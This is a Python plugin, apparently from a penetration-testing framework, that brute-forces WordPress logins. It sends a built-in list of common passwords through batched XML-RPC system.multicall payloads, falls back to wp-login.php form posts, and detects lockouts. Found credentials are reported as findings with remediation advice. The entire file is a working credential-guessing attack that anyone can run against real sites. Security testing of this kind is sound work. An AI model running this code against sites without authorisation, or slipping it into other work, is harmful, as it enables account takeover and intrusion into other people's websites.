"""WordPress brute force via XMLRPC multicall and wp-login.php."""

from __future__ import annotations

from typing import ClassVar

from basilisk.core.plugin import BasePlugin, PluginCategory, PluginMeta
from basilisk.models.result import Finding, PluginResult
from basilisk.models.target import Target

WP_PASSWORDS = [
    "admin", "password", "123456", "admin123", "12345678",
    "qwerty", "abc123", "password1", "1234", "letmein",
    "wordpress", "wp-admin", "changeme", "welcome", "welcome1",
    "root", "toor", "P@ssw0rd", "Aa123456", "Qwerty123",
    "111111", "000000", "654321", "1q2w3e", "q1w2e3r4",
    "master", "monkey", "dragon", "shadow", "sunshine",
    "trustno1", "iloveyou", "batman", "access", "hello",
    "charlie", "donald", "login", "passw0rd", "admin1",
    "admin@123", "pass123", "test123", "demo", "secret",
    "manager", "superadmin", "administrator", "Admin123", "Root123",
]

MULTICALL_BATCH = 10


class WpBrutePlugin(BasePlugin):
    meta: ClassVar[PluginMeta] = PluginMeta(
        name="wp_brute",
        display_name="WordPress Brute Force",
        category=PluginCategory.PENTESTING,
        description="WordPress auth brute force via XMLRPC multicall and wp-login.php",
        depends_on=["wordpress_scan"],
        produces=["wp_brute_findings"],
        timeout=120.0,
    )

    async def run(self, target: Target, ctx) -> PluginResult:
        if ctx.http is None:
            return PluginResult.fail(
                self.meta.name, target.host, error="HTTP client not available"
            )

        # Check WordPress (read per-host result from pipeline)
        wp_key = f"wordpress_scan:{target.host}"
        wp_result = ctx.pipeline.get(wp_key)
        wp_data = wp_result.data if (wp_result and wp_result.ok) else {}
        is_wp = wp_data.get("is_wordpress", False)
        if not is_wp:
            return PluginResult.success(
                self.meta.name, target.host,
                findings=[Finding.info("Not a WordPress site")],
                data={"wp_brute": {}},
            )

        findings: list[Finding] = []

        from basilisk.utils.http_check import resolve_base_url

        base_url = await resolve_base_url(target.host, ctx)
        if not base_url:
            return PluginResult.success(
                self.meta.name, target.host,
                findings=[Finding.info("Host not reachable")],
                data={"wp_brute": {}},
            )

        # Gather known users from wp_deep_scan pipeline result
        users: list[str] = []
        wp_deep_key = f"wp_deep_scan:{target.host}"
        wp_deep_result = ctx.pipeline.get(wp_deep_key)
        if wp_deep_result and wp_deep_result.ok:
            users = wp_deep_result.data.get("wp_deep", {}).get("users", [])
        if not users:
            users = ["admin"]

        brute_data: dict = {"tested_users": users, "found": [], "method": ""}

        # Try XMLRPC multicall first
        xmlrpc_url = f"{base_url}/xmlrpc.php"
        xmlrpc_available = False
        try:
            async with ctx.rate:
                resp = await ctx.http.post(
                    xmlrpc_url,
                    data=(
                        '<?xml version="1.0"?>'
                        "<methodCall><methodName>system.listMethods</methodName>"
                        "<params></params></methodCall>"
                    ),
                    headers={"Content-Type": "text/xml"},
                    timeout=8.0,
                )
                if resp.status == 200:
                    body = await resp.text(encoding="utf-8", errors="replace")
                    if "system.multicall" in body:
                        xmlrpc_available = True
        except Exception:
            pass

        if xmlrpc_available:
            brute_data["method"] = "xmlrpc_multicall"
            found = await self._xmlrpc_brute(
                xmlrpc_url, users, ctx, findings,
            )
            if found:
                brute_data["found"] = found
        else:
            brute_data["method"] = "wp_login"
            found = await self._wp_login_brute(
                base_url, users, ctx, findings,
            )
            if found:
                brute_data["found"] = found

        if not findings:
            findings.append(Finding.info(
                f"WP brute force: no credentials found ({len(users)} users, "
                f"{len(WP_PASSWORDS)} passwords)",
                tags=["pentesting", "wordpress", "brute"],
            ))

        return PluginResult.success(
            self.meta.name, target.host,
            findings=findings,
            data={"wp_brute": brute_data},
        )

    async def _xmlrpc_brute(
        self, xmlrpc_url: str, users: list[str], ctx,
        findings: list[Finding],
    ) -> list[dict]:
        """Brute force via XMLRPC system.multicall (batch of 10 per request)."""
        found: list[dict] = []

        for username in users:
            # Build passwords with username-specific variants
            passwords = list(WP_PASSWORDS)
            extra = [username, f"{username}123", f"{username}!", f"{username}1"]
            for e in extra:
                if e not in passwords:
                    passwords.append(e)

            # Send in batches
            for i in range(0, len(passwords), MULTICALL_BATCH):
                batch = passwords[i : i + MULTICALL_BATCH]
                calls_xml = ""
                for pwd in batch:
                    calls_xml += (
                        "<value><struct>"
                        "<member><name>methodName</name>"
                        "<value><string>wp.getUsersBlogs</string></value></member>"
                        "<member><name>params</name><value><array><data>"
                        f"<value><string>{_xml_escape(username)}</string></value>"
                        f"<value><string>{_xml_escape(pwd)}</string></value>"
                        "</data></array></value></member>"
                        "</struct></value>"
                    )

                payload = (
                    '<?xml version="1.0"?>'
                    "<methodCall><methodName>system.multicall</methodName>"
                    "<params><param><value><array><data>"
                    f"{calls_xml}"
                    "</data></array></value></param></params></methodCall>"
                )

                try:
                    async with ctx.rate:
                        resp = await ctx.http.post(
                            xmlrpc_url, data=payload,
                            headers={"Content-Type": "text/xml"},
                            timeout=15.0,
                        )
                        body = await resp.text(encoding="utf-8", errors="replace")
                except Exception:
                    continue

                if resp.status != 200:
                    continue

                # Parse multicall response â€” each call has its own result
                # Successful auth returns <name>blogid</name>
                # Failed auth returns <name>faultCode</name>
                results = body.split("<value>")
                for j, result_chunk in enumerate(results[1:]):
                    if "<name>blogid</name>" in result_chunk and j < len(batch):
                        pwd = batch[j]
                        found.append({"username": username, "password": pwd})
                        findings.append(Finding.critical(
                            f"WP credentials found: {username}:{pwd}",
                            description=(
                                "Valid WordPress credentials discovered via "
                                "XMLRPC multicall brute force"
                            ),
                            evidence="XMLRPC wp.getUsersBlogs returned blog data",
                            remediation=(
                                "Change password immediately. Enable 2FA. "
                                "Disable XML-RPC or limit auth attempts."
                            ),
                            tags=["pentesting", "wordpress", "credentials"],
                        ))
                        return found  # Stop on first success

                # Check for lockout
                if "Too many failed" in body or "blocked" in body.lower():
                    return found

        return found

    async def _wp_login_brute(
        self, base_url: str, users: list[str], ctx,
        findings: list[Finding],
    ) -> list[dict]:
        """Brute force via wp-login.php POST form."""
        found: list[dict] = []
        login_url = f"{base_url}/wp-login.php"

        for username in users:
            passwords = list(WP_PASSWORDS)
            extra = [username, f"{username}123", f"{username}!"]
            for e in extra:
                if e not in passwords:
                    passwords.append(e)

            consecutive_same = 0
            last_status = -1

            for pwd in passwords:
                try:
                    async with ctx.rate:
                        resp = await ctx.http.post(
                            login_url,
                            data={
                                "log": username,
                                "pwd": pwd,
                                "wp-submit": "Log In",
                                "redirect_to": f"{base_url}/wp-admin/",
                                "testcookie": "1",
                            },
                            timeout=10.0,
                            allow_redirects=False,
                        )
                except Exception:
                    continue

                # Success indicators
                cookies = resp.headers.getall("Set-Cookie", [])
                has_wp_cookie = any("wordpress_logged_in" in c for c in cookies)
                is_redirect = resp.status in (302, 303)
                location = resp.headers.get("Location", "")
                redirects_to_admin = "wp-admin" in location

                if has_wp_cookie or (is_redirect and redirects_to_admin):
                    found.append({"username": username, "password": pwd})
                    findings.append(Finding.critical(
                        f"WP credentials found: {username}:{pwd}",
                        description="Valid WordPress login via wp-login.php",
                        evidence="Redirect to wp-admin with auth cookie",
                        remediation=(
                            "Change password immediately. Enable 2FA. "
                            "Use limit-login-attempts plugin."
                        ),
                        tags=["pentesting", "wordpress", "credentials"],
                    ))
                    return found

                # Lockout detection
                if resp.status == last_status:
                    consecutive_same += 1
                else:
                    consecutive_same = 0
                    last_status = resp.status

                if consecutive_same >= 5 and resp.status == 403:
                    return found  # Likely locked out

        return found


def _xml_escape(s: str) -> str:
    """Escape special XML characters."""
    return (
        s.replace("&", "&amp;")
        .replace("<", "&lt;")
        .replace(">", "&gt;")
        .replace('"', "&quot;")
        .replace("'", "&apos;")
    )
